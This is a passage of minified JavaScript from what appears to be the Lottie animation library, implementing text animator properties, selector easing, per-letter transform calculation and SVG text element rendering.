                    (Ut = jt.splice(
                      Math.floor(Math.random() * jt.length),
                      1
                    )[0])),
                  (Tt.anIndexes[Pt] = Ut);
          }
          (i.yOffset = i.finalLineHeight || i.finalSize * 1.2),
            (i.ls = i.ls || 0),
            (i.ascent = (xt.ascent * i.finalSize) / 100);
        }),
        (TextProperty.prototype.updateDocumentData = function (i, a) {
          a = a === void 0 ? this.keysIndex : a;
          var o = this.copyData({}, this.data.d.k[a].s);
          (o = this.copyData(o, i)),
            (this.data.d.k[a].s = o),
            this.recalculate(a),
            this.setCurrentData(o),
            this.elem.addDynamicProperty(this);
        }),
        (TextProperty.prototype.recalculate = function (i) {
          var a = this.data.d.k[i].s;
          (a.__complete = !1),
            (this.keysIndex = 0),
            (this._isFirstFrame = !0),
            this.getValue(a);
        }),
        (TextProperty.prototype.canResizeFont = function (i) {
          (this.canResize = i),
            this.recalculate(this.keysIndex),
            this.elem.addDynamicProperty(this);
        }),
        (TextProperty.prototype.setMinimumFontSize = function (i) {
          (this.minimumFontSize = Math.floor(i) || 1),
            this.recalculate(this.keysIndex),
            this.elem.addDynamicProperty(this);
        });
      var TextSelectorProp = (function () {
        var i = Math.max,
          a = Math.min,
          o = Math.floor;
        function s(nt, ot) {
          (this._currentTextLength = -1),
            (this.k = !1),
            (this.data = ot),
            (this.elem = nt),
            (this.comp = nt.comp),
            (this.finalS = 0),
            (this.finalE = 0),
            this.initDynamicPropertyContainer(nt),
            (this.s = PropertyFactory.getProp(
              nt,
              ot.s || { k: 0 },
              0,
              0,
              this
            )),
            "e" in ot
              ? (this.e = PropertyFactory.getProp(nt, ot.e, 0, 0, this))
              : (this.e = { v: 100 }),
            (this.o = PropertyFactory.getProp(
              nt,
              ot.o || { k: 0 },
              0,
              0,
              this
            )),
            (this.xe = PropertyFactory.getProp(
              nt,
              ot.xe || { k: 0 },
              0,
              0,
              this
            )),
            (this.ne = PropertyFactory.getProp(
              nt,
              ot.ne || { k: 0 },
              0,
              0,
              this
            )),
            (this.sm = PropertyFactory.getProp(
              nt,
              ot.sm || { k: 100 },
              0,
              0,
              this
            )),
            (this.a = PropertyFactory.getProp(nt, ot.a, 0, 0.01, this)),
            this.dynamicProperties.length || this.getValue();
        }
        (s.prototype = {
          getMult: function (ot) {
            this._currentTextLength !==
              this.elem.textProperty.currentData.l.length && this.getValue();
            var st = 0,
              ft = 0,
              ht = 1,
              gt = 1;
            this.ne.v > 0 ? (st = this.ne.v / 100) : (ft = -this.ne.v / 100),
              this.xe.v > 0
                ? (ht = 1 - this.xe.v / 100)
                : (gt = 1 + this.xe.v / 100);
            var St = BezierFactory.getBezierEasing(st, ft, ht, gt).get,
              vt = 0,
              _t = this.finalS,
              Et = this.finalE,
              Ct = this.data.sh;
            if (Ct === 2)
              Et === _t
                ? (vt = ot >= Et ? 1 : 0)
                : (vt = i(0, a(0.5 / (Et - _t) + (ot - _t) / (Et - _t), 1))),
                (vt = St(vt));
            else if (Ct === 3)
              Et === _t
                ? (vt = ot >= Et ? 0 : 1)
                : (vt =
                    1 - i(0, a(0.5 / (Et - _t) + (ot - _t) / (Et - _t), 1))),
                (vt = St(vt));
            else if (Ct === 4)
              Et === _t
                ? (vt = 0)
                : ((vt = i(0, a(0.5 / (Et - _t) + (ot - _t) / (Et - _t), 1))),
                  vt < 0.5 ? (vt *= 2) : (vt = 1 - 2 * (vt - 0.5))),
                (vt = St(vt));
            else if (Ct === 5) {
              if (Et === _t) vt = 0;
              else {
                var Pt = Et - _t;
                ot = a(i(0, ot + 0.5 - _t), Et - _t);
                var bt = -Pt / 2 + ot,
                  xt = Pt / 2;
                vt = Math.sqrt(1 - (bt * bt) / (xt * xt));
              }
              vt = St(vt);
            } else
              Ct === 6
                ? (Et === _t
                    ? (vt = 0)
                    : ((ot = a(i(0, ot + 0.5 - _t), Et - _t)),
                      (vt =
                        (1 +
                          Math.cos(Math.PI + (Math.PI * 2 * ot) / (Et - _t))) /
                        2)),
                  (vt = St(vt)))
                : (ot >= o(_t) &&
                    (ot - _t < 0
                      ? (vt = i(0, a(a(Et, 1) - (_t - ot), 1)))
                      : (vt = i(0, a(Et - ot, 1)))),
                  (vt = St(vt)));
            if (this.sm.v !== 100) {
              var yt = this.sm.v * 0.01;
              yt === 0 && (yt = 1e-8);
              var wt = 0.5 - yt * 0.5;
              vt < wt ? (vt = 0) : ((vt = (vt - wt) / yt), vt > 1 && (vt = 1));
            }
            return vt * this.a.v;
          },
          getValue: function (ot) {
            this.iterateDynamicProperties(),
              (this._mdf = ot || this._mdf),
              (this._currentTextLength =
                this.elem.textProperty.currentData.l.length || 0),
              ot && this.data.r === 2 && (this.e.v = this._currentTextLength);
            var st = this.data.r === 2 ? 1 : 100 / this.data.totalChars,
              ft = this.o.v / st,
              ht = this.s.v / st + ft,
              gt = this.e.v / st + ft;
            if (ht > gt) {
              var St = ht;
              (ht = gt), (gt = St);
            }
            (this.finalS = ht), (this.finalE = gt);
          },
        }),
          extendPrototype([DynamicPropertyContainer], s);
        function tt(nt, ot, st) {
          return new s(nt, ot);
        }
        return { getTextSelectorProp: tt };
      })();
      function TextAnimatorDataProperty(i, a, o) {
        var s = { propType: !1 },
          tt = PropertyFactory.getProp,
          nt = a.a;
        (this.a = {
          r: nt.r ? tt(i, nt.r, 0, degToRads, o) : s,
          rx: nt.rx ? tt(i, nt.rx, 0, degToRads, o) : s,
          ry: nt.ry ? tt(i, nt.ry, 0, degToRads, o) : s,
          sk: nt.sk ? tt(i, nt.sk, 0, degToRads, o) : s,
          sa: nt.sa ? tt(i, nt.sa, 0, degToRads, o) : s,
          s: nt.s ? tt(i, nt.s, 1, 0.01, o) : s,
          a: nt.a ? tt(i, nt.a, 1, 0, o) : s,
          o: nt.o ? tt(i, nt.o, 0, 0.01, o) : s,
          p: nt.p ? tt(i, nt.p, 1, 0, o) : s,
          sw: nt.sw ? tt(i, nt.sw, 0, 0, o) : s,
          sc: nt.sc ? tt(i, nt.sc, 1, 0, o) : s,
          fc: nt.fc ? tt(i, nt.fc, 1, 0, o) : s,
          fh: nt.fh ? tt(i, nt.fh, 0, 0, o) : s,
          fs: nt.fs ? tt(i, nt.fs, 0, 0.01, o) : s,
          fb: nt.fb ? tt(i, nt.fb, 0, 0.01, o) : s,
          t: nt.t ? tt(i, nt.t, 0, 0, o) : s,
        }),
          (this.s = TextSelectorProp.getTextSelectorProp(i, a.s, o)),
          (this.s.t = a.s.t);
      }
      function TextAnimatorProperty(i, a, o) {
        (this._isFirstFrame = !0),
          (this._hasMaskedPath = !1),
          (this._frameId = -1),
          (this._textData = i),
          (this._renderType = a),
          (this._elem = o),
          (this._animatorsData = createSizedArray(this._textData.a.length)),
          (this._pathData = {}),
          (this._moreOptions = { alignment: {} }),
          (this.renderedLetters = []),
          (this.lettersChangedFlag = !1),
          this.initDynamicPropertyContainer(o);
      }
      (TextAnimatorProperty.prototype.searchProperties = function () {
        var i,
          a = this._textData.a.length,
          o,
          s = PropertyFactory.getProp;
        for (i = 0; i < a; i += 1)
          (o = this._textData.a[i]),
            (this._animatorsData[i] = new TextAnimatorDataProperty(
              this._elem,
              o,
              this
            ));
        this._textData.p && "m" in this._textData.p
          ? ((this._pathData = {
              a: s(this._elem, this._textData.p.a, 0, 0, this),
              f: s(this._elem, this._textData.p.f, 0, 0, this),
              l: s(this._elem, this._textData.p.l, 0, 0, this),
              r: s(this._elem, this._textData.p.r, 0, 0, this),
              p: s(this._elem, this._textData.p.p, 0, 0, this),
              m: this._elem.maskManager.getMaskProperty(this._textData.p.m),
            }),
            (this._hasMaskedPath = !0))
          : (this._hasMaskedPath = !1),
          (this._moreOptions.alignment = s(
            this._elem,
            this._textData.m.a,
            1,
            0,
            this
          ));
      }),
        (TextAnimatorProperty.prototype.getMeasures = function (i, a) {
          if (
            ((this.lettersChangedFlag = a),
            !(
              !this._mdf &&
              !this._isFirstFrame &&
              !a &&
              (!this._hasMaskedPath || !this._pathData.m._mdf)
            ))
          ) {
            this._isFirstFrame = !1;
            var o = this._moreOptions.alignment.v,
              s = this._animatorsData,
              tt = this._textData,
              nt = this.mHelper,
              ot = this._renderType,
              st = this.renderedLetters.length,
              ft,
              ht,
              gt,
              St,
              vt = i.l,
              _t,
              Et,
              Ct,
              Pt,
              bt,
              xt,
              yt,
              wt,
              $t,
              kt,
              Rt,
              It,
              Ot,
              Nt,
              zt;
            if (this._hasMaskedPath) {
              if (
                ((zt = this._pathData.m),
                !this._pathData.n || this._pathData._mdf)
              ) {
                var Bt = zt.v;
                this._pathData.r.v && (Bt = Bt.reverse()),
                  (_t = { tLength: 0, segments: [] }),
                  (St = Bt._length - 1);
                var Wt;
                for (It = 0, gt = 0; gt < St; gt += 1)
                  (Wt = bez.buildBezierData(
                    Bt.v[gt],
                    Bt.v[gt + 1],
                    [Bt.o[gt][0] - Bt.v[gt][0], Bt.o[gt][1] - Bt.v[gt][1]],
                    [
                      Bt.i[gt + 1][0] - Bt.v[gt + 1][0],
                      Bt.i[gt + 1][1] - Bt.v[gt + 1][1],
                    ]
                  )),
                    (_t.tLength += Wt.segmentLength),
                    _t.segments.push(Wt),
                    (It += Wt.segmentLength);
                (gt = St),
                  zt.v.c &&
                    ((Wt = bez.buildBezierData(
                      Bt.v[gt],
                      Bt.v[0],
                      [Bt.o[gt][0] - Bt.v[gt][0], Bt.o[gt][1] - Bt.v[gt][1]],
                      [Bt.i[0][0] - Bt.v[0][0], Bt.i[0][1] - Bt.v[0][1]]
                    )),
                    (_t.tLength += Wt.segmentLength),
                    _t.segments.push(Wt),
                    (It += Wt.segmentLength)),
                  (this._pathData.pi = _t);
              }
              if (
                ((_t = this._pathData.pi),
                (Et = this._pathData.f.v),
                (yt = 0),
                (xt = 1),
                (Pt = 0),
                (bt = !0),
                (kt = _t.segments),
                Et < 0 && zt.v.c)
              )
                for (
                  _t.tLength < Math.abs(Et) &&
                    (Et = -Math.abs(Et) % _t.tLength),
                    yt = kt.length - 1,
                    $t = kt[yt].points,
                    xt = $t.length - 1;
                  Et < 0;

                )
                  (Et += $t[xt].partialLength),
                    (xt -= 1),
                    xt < 0 &&
                      ((yt -= 1), ($t = kt[yt].points), (xt = $t.length - 1));
              ($t = kt[yt].points),
                (wt = $t[xt - 1]),
                (Ct = $t[xt]),
                (Rt = Ct.partialLength);
            }
            (St = vt.length), (ft = 0), (ht = 0);
            var Gt = i.finalSize * 1.2 * 0.714,
              Vt = !0,
              Mt,
              Ft,
              Tt,
              At,
              Lt;
            At = s.length;
            var jt,
              Dt = -1,
              Ut,
              Ht,
              Kt,
              qt = Et,
              Qt = yt,
              Zt = xt,
              Jt = -1,
              er,
              sr,
              nr,
              tr,
              Xt,
              hr,
              cr,
              yr,
              vr = "",
              xr = this.defaultPropsArray,
              Sr;
            if (i.j === 2 || i.j === 1) {
              var or = 0,
                mr = 0,
                Yt = i.j === 2 ? -0.5 : -1,
                rr = 0,
                ar = !0;
              for (gt = 0; gt < St; gt += 1)
                if (vt[gt].n) {
                  for (or && (or += mr); rr < gt; )
                    (vt[rr].animatorJustifyOffset = or), (rr += 1);
                  (or = 0), (ar = !0);
                } else {
                  for (Tt = 0; Tt < At; Tt += 1)
                    (Mt = s[Tt].a),
                      Mt.t.propType &&
                        (ar && i.j === 2 && (mr += Mt.t.v * Yt),
                        (Ft = s[Tt].s),
                        (jt = Ft.getMult(
                          vt[gt].anIndexes[Tt],
                          tt.a[Tt].s.totalChars
                        )),
                        jt.length
                          ? (or += Mt.t.v * jt[0] * Yt)
                          : (or += Mt.t.v * jt * Yt));
                  ar = !1;
                }
              for (or && (or += mr); rr < gt; )
                (vt[rr].animatorJustifyOffset = or), (rr += 1);
            }
            for (gt = 0; gt < St; gt += 1) {
              if ((nt.reset(), (er = 1), vt[gt].n))
                (ft = 0),
                  (ht += i.yOffset),
                  (ht += Vt ? 1 : 0),
                  (Et = qt),
                  (Vt = !1),
                  this._hasMaskedPath &&
                    ((yt = Qt),
                    (xt = Zt),
                    ($t = kt[yt].points),
                    (wt = $t[xt - 1]),
                    (Ct = $t[xt]),
                    (Rt = Ct.partialLength),
                    (Pt = 0)),
                  (vr = ""),
                  (yr = ""),
                  (hr = ""),
                  (Sr = ""),
                  (xr = this.defaultPropsArray);
              else {
                if (this._hasMaskedPath) {
                  if (Jt !== vt[gt].line) {
                    switch (i.j) {
                      case 1:
                        Et += It - i.lineWidths[vt[gt].line];
                        break;
                      case 2:
                        Et += (It - i.lineWidths[vt[gt].line]) / 2;
                        break;
                    }
                    Jt = vt[gt].line;
                  }
                  Dt !== vt[gt].ind &&
                    (vt[Dt] && (Et += vt[Dt].extra),
                    (Et += vt[gt].an / 2),
                    (Dt = vt[gt].ind)),
                    (Et += o[0] * vt[gt].an * 0.005);
                  var gr = 0;
                  for (Tt = 0; Tt < At; Tt += 1)
                    (Mt = s[Tt].a),
                      Mt.p.propType &&
                        ((Ft = s[Tt].s),
                        (jt = Ft.getMult(
                          vt[gt].anIndexes[Tt],
                          tt.a[Tt].s.totalChars
                        )),
                        jt.length
                          ? (gr += Mt.p.v[0] * jt[0])
                          : (gr += Mt.p.v[0] * jt)),
                      Mt.a.propType &&
                        ((Ft = s[Tt].s),
                        (jt = Ft.getMult(
                          vt[gt].anIndexes[Tt],
                          tt.a[Tt].s.totalChars
                        )),
                        jt.length
                          ? (gr += Mt.a.v[0] * jt[0])
                          : (gr += Mt.a.v[0] * jt));
                  for (
                    bt = !0,
                      this._pathData.a.v &&
                        ((Et =
                          vt[0].an * 0.5 +
                          ((It -
                            this._pathData.f.v -
                            vt[0].an * 0.5 -
                            vt[vt.length - 1].an * 0.5) *
                            Dt) /
                            (St - 1)),
                        (Et += this._pathData.f.v));
                    bt;

                  )
                    Pt + Rt >= Et + gr || !$t
                      ? ((Ot = (Et + gr - Pt) / Ct.partialLength),
                        (Ht = wt.point[0] + (Ct.point[0] - wt.point[0]) * Ot),
                        (Kt = wt.point[1] + (Ct.point[1] - wt.point[1]) * Ot),
                        nt.translate(
                          -o[0] * vt[gt].an * 0.005,
                          -(o[1] * Gt) * 0.01
                        ),
                        (bt = !1))
                      : $t &&
                        ((Pt += Ct.partialLength),
                        (xt += 1),
                        xt >= $t.length &&
                          ((xt = 0),
                          (yt += 1),
                          kt[yt]
                            ? ($t = kt[yt].points)
                            : zt.v.c
                            ? ((xt = 0), (yt = 0), ($t = kt[yt].points))
                            : ((Pt -= Ct.partialLength), ($t = null))),
                        $t &&
                          ((wt = Ct), (Ct = $t[xt]), (Rt = Ct.partialLength)));
                  (Ut = vt[gt].an / 2 - vt[gt].add), nt.translate(-Ut, 0, 0);
                } else
                  (Ut = vt[gt].an / 2 - vt[gt].add),
                    nt.translate(-Ut, 0, 0),
                    nt.translate(
                      -o[0] * vt[gt].an * 0.005,
                      -o[1] * Gt * 0.01,
                      0
                    );
                for (Tt = 0; Tt < At; Tt += 1)
                  (Mt = s[Tt].a),
                    Mt.t.propType &&
                      ((Ft = s[Tt].s),
                      (jt = Ft.getMult(
                        vt[gt].anIndexes[Tt],
                        tt.a[Tt].s.totalChars
                      )),
                      (ft !== 0 || i.j !== 0) &&
                        (this._hasMaskedPath
                          ? jt.length
                            ? (Et += Mt.t.v * jt[0])
                            : (Et += Mt.t.v * jt)
                          : jt.length
                          ? (ft += Mt.t.v * jt[0])
                          : (ft += Mt.t.v * jt)));
                for (
                  i.strokeWidthAnim && (nr = i.sw || 0),
                    i.strokeColorAnim &&
                      (i.sc
                        ? (sr = [i.sc[0], i.sc[1], i.sc[2]])
                        : (sr = [0, 0, 0])),
                    i.fillColorAnim &&
                      i.fc &&
                      (tr = [i.fc[0], i.fc[1], i.fc[2]]),
                    Tt = 0;
                  Tt < At;
                  Tt += 1
                )
                  (Mt = s[Tt].a),
                    Mt.a.propType &&
                      ((Ft = s[Tt].s),
                      (jt = Ft.getMult(
                        vt[gt].anIndexes[Tt],
                        tt.a[Tt].s.totalChars
                      )),
                      jt.length
                        ? nt.translate(
                            -Mt.a.v[0] * jt[0],
                            -Mt.a.v[1] * jt[1],
                            Mt.a.v[2] * jt[2]
                          )
                        : nt.translate(
                            -Mt.a.v[0] * jt,
                            -Mt.a.v[1] * jt,
                            Mt.a.v[2] * jt
                          ));
                for (Tt = 0; Tt < At; Tt += 1)
                  (Mt = s[Tt].a),
                    Mt.s.propType &&
                      ((Ft = s[Tt].s),
                      (jt = Ft.getMult(
                        vt[gt].anIndexes[Tt],
                        tt.a[Tt].s.totalChars
                      )),
                      jt.length
                        ? nt.scale(
                            1 + (Mt.s.v[0] - 1) * jt[0],
                            1 + (Mt.s.v[1] - 1) * jt[1],
                            1
                          )
                        : nt.scale(
                            1 + (Mt.s.v[0] - 1) * jt,
                            1 + (Mt.s.v[1] - 1) * jt,
                            1
                          ));
                for (Tt = 0; Tt < At; Tt += 1) {
                  if (
                    ((Mt = s[Tt].a),
                    (Ft = s[Tt].s),
                    (jt = Ft.getMult(
                      vt[gt].anIndexes[Tt],
                      tt.a[Tt].s.totalChars
                    )),
                    Mt.sk.propType &&
                      (jt.length
                        ? nt.skewFromAxis(-Mt.sk.v * jt[0], Mt.sa.v * jt[1])
                        : nt.skewFromAxis(-Mt.sk.v * jt, Mt.sa.v * jt)),
                    Mt.r.propType &&
                      (jt.length
                        ? nt.rotateZ(-Mt.r.v * jt[2])
                        : nt.rotateZ(-Mt.r.v * jt)),
                    Mt.ry.propType &&
                      (jt.length
                        ? nt.rotateY(Mt.ry.v * jt[1])
                        : nt.rotateY(Mt.ry.v * jt)),
                    Mt.rx.propType &&
                      (jt.length
                        ? nt.rotateX(Mt.rx.v * jt[0])
                        : nt.rotateX(Mt.rx.v * jt)),
                    Mt.o.propType &&
                      (jt.length
                        ? (er += (Mt.o.v * jt[0] - er) * jt[0])
                        : (er += (Mt.o.v * jt - er) * jt)),
                    i.strokeWidthAnim &&
                      Mt.sw.propType &&
                      (jt.length
                        ? (nr += Mt.sw.v * jt[0])
                        : (nr += Mt.sw.v * jt)),
                    i.strokeColorAnim && Mt.sc.propType)
                  )
                    for (Xt = 0; Xt < 3; Xt += 1)
                      jt.length
                        ? (sr[Xt] += (Mt.sc.v[Xt] - sr[Xt]) * jt[0])
                        : (sr[Xt] += (Mt.sc.v[Xt] - sr[Xt]) * jt);
                  if (i.fillColorAnim && i.fc) {
                    if (Mt.fc.propType)
                      for (Xt = 0; Xt < 3; Xt += 1)
                        jt.length
                          ? (tr[Xt] += (Mt.fc.v[Xt] - tr[Xt]) * jt[0])
                          : (tr[Xt] += (Mt.fc.v[Xt] - tr[Xt]) * jt);
                    Mt.fh.propType &&
                      (jt.length
                        ? (tr = addHueToRGB(tr, Mt.fh.v * jt[0]))
                        : (tr = addHueToRGB(tr, Mt.fh.v * jt))),
                      Mt.fs.propType &&
                        (jt.length
                          ? (tr = addSaturationToRGB(tr, Mt.fs.v * jt[0]))
                          : (tr = addSaturationToRGB(tr, Mt.fs.v * jt))),
                      Mt.fb.propType &&
                        (jt.length
                          ? (tr = addBrightnessToRGB(tr, Mt.fb.v * jt[0]))
                          : (tr = addBrightnessToRGB(tr, Mt.fb.v * jt)));
                  }
                }
                for (Tt = 0; Tt < At; Tt += 1)
                  (Mt = s[Tt].a),
                    Mt.p.propType &&
                      ((Ft = s[Tt].s),
                      (jt = Ft.getMult(
                        vt[gt].anIndexes[Tt],
                        tt.a[Tt].s.totalChars
                      )),
                      this._hasMaskedPath
                        ? jt.length
                          ? nt.translate(
                              0,
                              Mt.p.v[1] * jt[0],
                              -Mt.p.v[2] * jt[1]
                            )
                          : nt.translate(0, Mt.p.v[1] * jt, -Mt.p.v[2] * jt)
                        : jt.length
                        ? nt.translate(
                            Mt.p.v[0] * jt[0],
                            Mt.p.v[1] * jt[1],
                            -Mt.p.v[2] * jt[2]
                          )
                        : nt.translate(
                            Mt.p.v[0] * jt,
                            Mt.p.v[1] * jt,
                            -Mt.p.v[2] * jt
                          ));
                if (
                  (i.strokeWidthAnim && (hr = nr < 0 ? 0 : nr),
                  i.strokeColorAnim &&
                    (cr =
                      "rgb(" +
                      Math.round(sr[0] * 255) +
                      "," +
                      Math.round(sr[1] * 255) +
                      "," +
                      Math.round(sr[2] * 255) +
                      ")"),
                  i.fillColorAnim &&
                    i.fc &&
                    (yr =
                      "rgb(" +
                      Math.round(tr[0] * 255) +
                      "," +
                      Math.round(tr[1] * 255) +
                      "," +
                      Math.round(tr[2] * 255) +
                      ")"),
                  this._hasMaskedPath)
                ) {
                  if (
                    (nt.translate(0, -i.ls),
                    nt.translate(0, o[1] * Gt * 0.01 + ht, 0),
                    this._pathData.p.v)
                  ) {
                    Nt =
                      (Ct.point[1] - wt.point[1]) / (Ct.point[0] - wt.point[0]);
                    var br = (Math.atan(Nt) * 180) / Math.PI;
                    Ct.point[0] < wt.point[0] && (br += 180),
                      nt.rotate((-br * Math.PI) / 180);
                  }
                  nt.translate(Ht, Kt, 0),
                    (Et -= o[0] * vt[gt].an * 0.005),
                    vt[gt + 1] &&
                      Dt !== vt[gt + 1].ind &&
                      ((Et += vt[gt].an / 2),
                      (Et += i.tr * 0.001 * i.finalSize));
                } else {
                  switch (
                    (nt.translate(ft, ht, 0),
                    i.ps && nt.translate(i.ps[0], i.ps[1] + i.ascent, 0),
                    i.j)
                  ) {
                    case 1:
                      nt.translate(
                        vt[gt].animatorJustifyOffset +
                          i.justifyOffset +
                          (i.boxWidth - i.lineWidths[vt[gt].line]),
                        0,
                        0
                      );
                      break;
                    case 2:
                      nt.translate(
                        vt[gt].animatorJustifyOffset +
                          i.justifyOffset +
                          (i.boxWidth - i.lineWidths[vt[gt].line]) / 2,
                        0,
                        0
                      );
                      break;
                  }
                  nt.translate(0, -i.ls),
                    nt.translate(Ut, 0, 0),
                    nt.translate(o[0] * vt[gt].an * 0.005, o[1] * Gt * 0.01, 0),
                    (ft += vt[gt].l + i.tr * 0.001 * i.finalSize);
                }
                ot === "html"
                  ? (vr = nt.toCSS())
                  : ot === "svg"
                  ? (vr = nt.to2dCSS())
                  : (xr = [
                      nt.props[0],
                      nt.props[1],
                      nt.props[2],
                      nt.props[3],
                      nt.props[4],
                      nt.props[5],
                      nt.props[6],
                      nt.props[7],
                      nt.props[8],
                      nt.props[9],
                      nt.props[10],
                      nt.props[11],
                      nt.props[12],
                      nt.props[13],
                      nt.props[14],
                      nt.props[15],
                    ]),
                  (Sr = er);
              }
              st <= gt
                ? ((Lt = new LetterProps(Sr, hr, cr, yr, vr, xr)),
                  this.renderedLetters.push(Lt),
                  (st += 1),
                  (this.lettersChangedFlag = !0))
                : ((Lt = this.renderedLetters[gt]),
                  (this.lettersChangedFlag =
                    Lt.update(Sr, hr, cr, yr, vr, xr) ||
                    this.lettersChangedFlag));
            }
          }
        }),
        (TextAnimatorProperty.prototype.getValue = function () {
          this._elem.globalData.frameId !== this._frameId &&
            ((this._frameId = this._elem.globalData.frameId),
            this.iterateDynamicProperties());
        }),
        (TextAnimatorProperty.prototype.mHelper = new Matrix()),
        (TextAnimatorProperty.prototype.defaultPropsArray = []),
        extendPrototype([DynamicPropertyContainer], TextAnimatorProperty);
      function ITextElement() {}
      (ITextElement.prototype.initElement = function (i, a, o) {
        (this.lettersChangedFlag = !0),
          this.initFrame(),
          this.initBaseData(i, a, o),
          (this.textProperty = new TextProperty(
            this,
            i.t,
            this.dynamicProperties
          )),
          (this.textAnimator = new TextAnimatorProperty(
            i.t,
            this.renderType,
            this
          )),
          this.initTransform(i, a, o),
          this.initHierarchy(),
          this.initRenderable(),
          this.initRendererElement(),
          this.createContainerElements(),
          this.createRenderableComponents(),
          this.createContent(),
          this.hide(),
          this.textAnimator.searchProperties(this.dynamicProperties);
      }),
        (ITextElement.prototype.prepareFrame = function (i) {
          (this._mdf = !1),
            this.prepareRenderableFrame(i),
            this.prepareProperties(i, this.isInRange);
        }),
        (ITextElement.prototype.createPathShape = function (i, a) {
          var o,
            s = a.length,
            tt,
            nt = "";
          for (o = 0; o < s; o += 1)
            a[o].ty === "sh" &&
              ((tt = a[o].ks.k),
              (nt += buildShapeString(tt, tt.i.length, !0, i)));
          return nt;
        }),
        (ITextElement.prototype.updateDocumentData = function (i, a) {
          this.textProperty.updateDocumentData(i, a);
        }),
        (ITextElement.prototype.canResizeFont = function (i) {
          this.textProperty.canResizeFont(i);
        }),
        (ITextElement.prototype.setMinimumFontSize = function (i) {
          this.textProperty.setMinimumFontSize(i);
        }),
        (ITextElement.prototype.applyTextPropertiesToMatrix = function (
          i,
          a,
          o,
          s,
          tt
        ) {
          switch (
            (i.ps && a.translate(i.ps[0], i.ps[1] + i.ascent, 0),
            a.translate(0, -i.ls, 0),
            i.j)
          ) {
            case 1:
              a.translate(
                i.justifyOffset + (i.boxWidth - i.lineWidths[o]),
                0,
                0
              );
              break;
            case 2:
              a.translate(
                i.justifyOffset + (i.boxWidth - i.lineWidths[o]) / 2,
                0,
                0
              );
              break;
          }
          a.translate(s, tt, 0);
        }),
        (ITextElement.prototype.buildColor = function (i) {
          return (
            "rgb(" +
            Math.round(i[0] * 255) +
            "," +
            Math.round(i[1] * 255) +
            "," +
            Math.round(i[2] * 255) +
            ")"
          );
        }),
        (ITextElement.prototype.emptyProp = new LetterProps()),
        (ITextElement.prototype.destroy = function () {}),
        (ITextElement.prototype.validateText = function () {
          (this.textProperty._mdf || this.textProperty._isFirstFrame) &&
            (this.buildNewText(),
            (this.textProperty._isFirstFrame = !1),
            (this.textProperty._mdf = !1));
        });
      var emptyShapeData = { shapes: [] };
      function SVGTextLottieElement(i, a, o) {
        (this.textSpans = []),
          (this.renderType = "svg"),
          this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          SVGBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
          ITextElement,
        ],
        SVGTextLottieElement
      ),
        (SVGTextLottieElement.prototype.createContent = function () {
          this.data.singleShape &&
            !this.globalData.fontManager.chars &&
            (this.textContainer = createNS("text"));
        }),
        (SVGTextLottieElement.prototype.buildTextContents = function (i) {
          for (var a = 0, o = i.length, s = [], tt = ""; a < o; )
            i[a] === "\r" || i[a] === ""
              ? (s.push(tt), (tt = ""))
              : (tt += i[a]),
              (a += 1);
          return s.push(tt), s;
        }),
        (SVGTextLottieElement.prototype.buildShapeData = function (i, a) {
          if (i.shapes && i.shapes.length) {
            var o = i.shapes[0];
            if (o.it) {
              var s = o.it[o.it.length - 1];
              s.s && ((s.s.k[0] = a), (s.s.k[1] = a));
            }
          }
          return i;
        }),
        (SVGTextLottieElement.prototype.buildNewText = function () {
          this.addDynamicProperty(this);
          var i,
            a,
            o = this.textProperty.currentData;
          (this.renderedLetters = createSizedArray(o ? o.l.length : 0)),
            o.fc
              ? this.layerElement.setAttribute("fill", this.buildColor(o.fc))
              : this.layerElement.setAttribute("fill", "rgba(0,0,0,0)"),
            o.sc &&
              (this.layerElement.setAttribute("stroke", this.buildColor(o.sc)),
              this.layerElement.setAttribute("stroke-width", o.sw)),
            this.layerElement.setAttribute("font-size", o.finalSize);
          var s = this.globalData.fontManager.getFontByName(o.f);
          if (s.fClass) this.layerElement.setAttribute("class", s.fClass);
          else {
            this.layerElement.setAttribute("font-family", s.fFamily);
            var tt = o.fWeight,
              nt = o.fStyle;
            this.layerElement.setAttribute("font-style", nt),
              this.layerElement.setAttribute("font-weight", tt);
          }
          this.layerElement.setAttribute("aria-label", o.t);
          var ot = o.l || [],
            st = !!this.globalData.fontManager.chars;
          a = ot.length;
          var ft,
            ht = this.mHelper,
            gt = "",
            St = this.data.singleShape,
            vt = 0,
            _t = 0,
            Et = !0,
            Ct = o.tr * 0.001 * o.finalSize;
          if (St && !st && !o.sz) {
            var Pt = this.textContainer,
              bt = "start";
            switch (o.j) {
              case 1:
                bt = "end";
                break;
              case 2:
                bt = "middle";
                break;
              default:
                bt = "start";
                break;
            }
            Pt.setAttribute("text-anchor", bt),
              Pt.setAttribute("letter-spacing", Ct);
            var xt = this.buildTextContents(o.finalText);
            for (
              a = xt.length, _t = o.ps ? o.ps[1] + o.ascent : 0, i = 0;
              i < a;
              i += 1
            )
              (ft = this.textSpans[i].span || createNS("tspan")),
                (ft.textContent = xt[i]),
                ft.setAttribute("x", 0),
                ft.setAttribute("y", _t),
                (ft.style.display = "inherit"),
                Pt.appendChild(ft),
                this.textSpans[i] ||
                  (this.textSpans[i] = { span: null, glyph: null }),
                (this.textSpans[i].span = ft),
                (_t += o.finalLineHeight);
            this.layerElement.appendChild(Pt);
          } else {
            var yt = this.textSpans.length,
              wt;
            for (i = 0; i < a; i += 1) {
              if (
                (this.textSpans[i] ||
                  (this.textSpans[i] = {
                    span: null,
                    childSpan: null,
                    glyph: null,
                  }),
                !st || !St || i === 0)
              ) {
                if (
                  ((ft =
                    yt > i
                      ? this.textSpans[i].span
                      : createNS(st ? "g" : "text")),
                  yt <= i)
                ) {
                  if (
                    (ft.setAttribute("stroke-linecap", "butt"),
                    ft.setAttribute("stroke-linejoin", "round"),
                    ft.setAttribute("stroke-miterlimit", "4"),
                    (this.textSpans[i].span = ft),
                    st)
                  ) {
                    var $t = createNS("g");
                    ft.appendChild($t), (this.textSpans[i].childSpan = $t);
                  }
                  (this.textSpans[i].span = ft),
                    this.layerElement.appendChild(ft);
                }
                ft.style.display = "inherit";
              }
              if (
                (ht.reset(),
                St &&
                  (ot[i].n &&
                    ((vt = -Ct),
                    (_t += o.yOffset),
                    (_t += Et ? 1 : 0),
                    (Et = !1)),
                  this.applyTextPropertiesToMatrix(o, ht, ot[i].line, vt, _t),
                  (vt += ot[i].l || 0),
                  (vt += Ct)),
                st)
              ) {
                wt = this.globalData.fontManager.getCharData(
                  o.finalText[i],
                  s.fStyle,
